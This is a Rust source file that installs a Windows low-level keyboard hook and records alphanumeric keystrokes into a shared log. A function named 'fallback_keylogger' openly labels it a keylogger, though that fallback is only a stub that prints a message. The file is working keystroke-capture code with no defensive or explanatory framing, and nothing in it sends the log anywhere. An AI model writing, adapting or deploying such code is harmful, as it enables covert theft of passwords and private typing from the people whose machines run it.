use std::sync::{Arc, Mutex};
use winapi::um::winuser::{
    SetWindowsHookExW, CallNextHookEx, UnhookWindowsHookEx, WH_KEYBOARD_LL, GetMessageW,
    TranslateMessage, DispatchMessageW, WM_KEYDOWN,
};
use winapi::um::libloaderapi::GetModuleHandleW;
use std::ptr::null_mut;
use std::thread;
use std::time::Duration;

static mut LOG: Option<Arc<Mutex<String>>> = None;

pub fn monitor_input(log: Arc<Mutex<String>>) {
    unsafe {
        LOG = Some(log);
        let hook = SetWindowsHookExW(WH_KEYBOARD_LL, Some(hook_proc), GetModuleHandleW(null_mut()), 0);
        if hook.is_null() {
            eprintln!("Failed to set hook, falling back to alternative method...");
            fallback_keylogger();
            return;
        }
        let mut msg = std::mem::zeroed();
        while GetMessageW(&mut msg, null_mut(), 0, 0) > 0 {
            TranslateMessage(&msg);
            DispatchMessageW(&msg);
        }
        UnhookWindowsHookEx(hook);
    }
}

unsafe extern "system" fn hook_proc(code: i32, wparam: usize, lparam: isize) -> isize {
    if code >= 0 && wparam as u32 == WM_KEYDOWN {
        let vk_code = *(lparam as *const i32);
        if is_sensitive_key(vk_code as u8 as char) {
            if let Some(log) = LOG.as_ref() {
                let mut log = log.lock().unwrap();
                log.push(vk_code as u8 as char);
            }
            thread::sleep(Duration::from_millis(200));
        }
    }
    CallNextHookEx(null_mut(), code, wparam, lparam)
}

fn fallback_keylogger() {
    eprintln!("Using fallback keylogger...");
}

fn is_sensitive_key(key: char) -> bool {
    let sensitive_keys = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
    sensitive_keys.contains(key)
}
